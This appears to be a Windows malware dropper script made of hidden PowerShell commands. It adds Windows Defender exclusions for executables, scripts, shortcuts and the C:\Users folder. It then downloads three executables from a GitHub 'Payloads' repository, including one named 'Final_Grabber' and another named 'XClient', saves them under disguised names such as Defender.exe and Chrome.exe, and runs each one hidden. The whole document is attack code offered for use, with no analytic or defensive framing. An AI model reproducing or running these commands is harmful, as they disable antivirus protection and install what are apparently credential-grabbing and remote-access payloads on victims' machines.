powershell -Windowstyle Hidden Add-MpPreference -ExclusionExtension ".exe"
powershell -Windowstyle Hidden Add-MpPreference -ExclusionExtension ".ps1"
powershell -Windowstyle Hidden Add-MpPreference -ExclusionExtension ".lnk"
powershell -Windowstyle Hidden Add-MpPreference -ExclusionPath "C:\Users"


powershell -Windowstyle Hidden -ep bypass iwr -uri  https://github.com/rude90/Payloads/raw/main/Final_Grabber.exe -o C:\Users\Defender.exe
powershell.exe -w Hidden C:\Users\Defender.exe

powershell -Windowstyle Hidden -ep bypass iwr -uri  https://github.com/rude90/Payloads/raw/main/XClient.exe -o C:\Users\Chrome.exe
powershell.exe -w Hidden C:\Users\Chrome.exe

powershell -Windowstyle Hidden -ep bypass iwr -uri  https://github.com/rude90/out/raw/main/Microsoft%20Defender%20Multi%20Protection%20utility.exe -o C:\Users\Defender_Protection_utility.exe
powershell.exe -w Hidden C:\Users\Defender_Protection_utility.exe
